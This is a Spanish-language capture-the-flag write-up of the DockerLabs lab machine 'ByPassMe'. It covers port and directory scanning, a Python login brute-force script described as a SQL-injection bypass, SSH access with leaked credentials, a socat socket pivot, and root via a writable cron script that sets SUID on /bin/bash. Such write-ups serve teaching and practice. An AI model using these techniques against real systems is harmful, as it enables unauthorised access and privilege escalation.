@@ -1,0 +1,263 @@
+---
+title: ByPassMe
+description: Resolución completa de la máquina virtual *ByPassMe* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **ByPassMe**, desarrollada por *RSA* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo el bypass de autenticación. Tras acceder al panel, se encuentra un archivo de logs que contiene credenciales en texto plano del usuario `albert`, permitiendo el acceso SSH al sistema.
+Una vez dentro, se identifican procesos y configuraciones inseguras: un socket UNIX de `socat` permite moverse al usuario `conx`, y una tarea cron ejecutada por `root` utiliza un script escribible por usuarios comunes, facilitando la escalada de privilegios mediante la inyección de comandos maliciosos para obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'ByPassMe',
+    Autor: 'RSA',
+    Dificultad: 'Fácil',
+    Fecha: '30/05/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip ByPassMe.zip
+sudo bash auto_deploy.sh ByPassMe.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p ByPassMe/{content,exploits,nmap,scripts}
+cd ByPassMe
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761115748/Ports_tqwjrf.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1761115747/Gobuster_wp5fs4.png)
+
+**Rutas encontradas:**
+- `/index.php`
+- `/login.php`
+  ![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1761115747/Login.php_z6enum.png)
+- `/welcome.php`
+- `/logs`
+
+Todas las rutas redirigen al formulario de inicio de sesión, sugiriendo que el acceso está protegido por autenticación.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Bypass de autenticación
+
+El nombre de la máquina, "ByPassMe", sugiere que la vulnerabilidad está relacionada con un bypass de login, probablemente mediante una **inyección SQL (SQLi)**.
+
+Se desarrolla un script en Python para automatizar pruebas de inyección en el campo `password`:
+
+```python
+import requests
+
+def brute_force_password(password_list):
+    burp0_url = "http://172.17.0.2:80/login.php"
+    burp0_headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+        "Accept": "text/html,application/xhtml+xml"
+    }
+
+    for password in password_list:
+        burp0_data = {"username": "test", "password": password.strip()}
+
+        try:
+            response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+            print(f"Probando: {password.strip()} - Status: {response.status_code} - Longitud: {len(response.content)}")
+
+            if any(word in response.text for word in ["Bienvenido", "Dashboard", "logout"]):
+                print(f"[+] CONTRASEÑA ENCONTRADA: {password}")
+                return password
+
+        except Exception as e:
+            print(f"Error con {password}: {e}")
+
+    print("[-] Contraseña no encontrada")
+    return None
+
+with open('dictionary.txt', 'r') as f:
+    passwords = f.readlines()
+
+brute_force_password(passwords)
+```
+
+Se captura una **cookie de sesión válida** que permite acceder al panel, logrando el **bypass del login**:
+
+![Welcome](https://res.cloudinary.com/dewqswzke/image/upload/v1761115750/Welcome_vgphsu.png)
+
+### 2.2 Extracción de credenciales
+
+Se enumera el directorio `/logs`. No se permite el listado directo, por lo que se recurre al fuzzing con **FFUF**:
+
+![Ffuf](https://res.cloudinary.com/dewqswzke/image/upload/v1761115747/Fuff_bilwsb.png)
+
+Se encuentra el archivo `logs.txt`, visible desde el navegador:
+
+![Logs.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1761115748/Logs.txt_kqog49.png)
+
+En su contenido aparecen **credenciales en texto plano** del usuario `albert`.
+
+### 2.3 Acceso SSH
+
+Con las credenciales obtenidas, se inicia sesión por SSH:
+
+```bash
+ssh albert@172.17.0.2
+```
+
+![SSH login](https://res.cloudinary.com/dewqswzke/image/upload/v1761115747/Albert_c7npcx.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De albert → conx
+
+Una vez dentro del sistema como `albert`, se enumeran procesos y configuraciones. Con el comando `ps aux`, se observa un proceso **socat** escuchando conexiones locales:
+
+![Ps aux](https://res.cloudinary.com/dewqswzke/image/upload/v1761115748/PsAux_cdsvu8.png)
+
+Se aprovecha esto para conectarse al socket UNIX del usuario `conx`:
+
+```bash
+socat - UNIX-CONNECT:/home/conx/.cache/.sock
+```
+
+La conexión otorga una nueva sesión como el usuario `conx`:
+
+![User conx](https://res.cloudinary.com/dewqswzke/image/upload/v1761115747/Conx_hgjglb.png)
+
+### 3.2 De conx → root
+
+Se repite la enumeración con `ps aux` y se detecta un **proceso cron** ejecutado por `root`:
+
+![Ps cron](https://res.cloudinary.com/dewqswzke/image/upload/v1761115748/PsCron_kxc15z.png)
+
+Se listan las tareas programadas en `/etc/cron.d/`:
+
+```bash
+ls -la /etc/cron.d/
+```
+
+Se identifica un archivo llamado `backup-cron` con el siguiente contenido:
+
+```
+* * * * * root bash /var/backups/backup.sh
+```
+
+Este cron ejecuta un script **editable por usuarios comunes**, lo que constituye una grave vulnerabilidad. Se modifica para escalar privilegios:
+
+```bash
+echo "chmod u+s /bin/bash" >> /var/backups/backup.sh
+```
+
+Tras esperar un minuto, el cron ejecuta el cambio. Se obtiene una shell privilegiada con:
+
+```bash
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761115749/Root_awpylm.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SQL Injection en formulario de login",
+      severity: "Crítica",
+      impact: "Bypass de autenticación y acceso no autorizado"
+    },
+    {
+      vulnerability: "Archivo de logs expuesto con credenciales en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso de acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Socket UNIX de socat accesible para movimiento lateral",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario conx"
+    },
+    {
+      vulnerability: "Script cron ejecutado por root y escribible por usuarios comunes",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de validación de entradas en el formulario web",
+      severity: "Alta",
+      impact: "Múltiples vectores de inyección"
+    }
+  ]}
+/>
